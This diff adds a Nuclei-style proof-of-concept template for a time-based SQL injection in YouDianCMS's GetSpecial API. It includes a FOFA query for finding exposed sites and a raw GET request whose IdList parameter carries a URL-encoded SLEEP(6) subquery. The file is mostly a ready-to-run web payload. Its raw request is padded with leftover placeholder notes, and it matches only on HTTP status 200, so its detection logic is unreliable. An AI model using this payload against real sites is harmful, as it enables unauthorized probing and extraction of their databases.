@@ -1,0 +1,49 @@
+id: poc-txplgbbz11ocbvn9
+info:
+  name: YouDianCMS友点系统GetSpecial接口SQL延时注入漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/txplgbbz11ocbvn9'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: txplgbbz11ocbvn9
+    fofa: app="友点建站-CMS"
+http:
+- raw:
+  - 'GET /index.php/api/GetSpecial?debug=1&ChannelID=1&IdList=1,1%29%20and%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%286%29%29%29A HTTP/1.1
+
+
+    accept: */*
+
+
+    Accept-Encoding: gzip, deflate, br
+
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+
+    Cookie: PHPSESSID=din23h07blv026kk4tdqt1re00
+
+
+    Connection: close
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
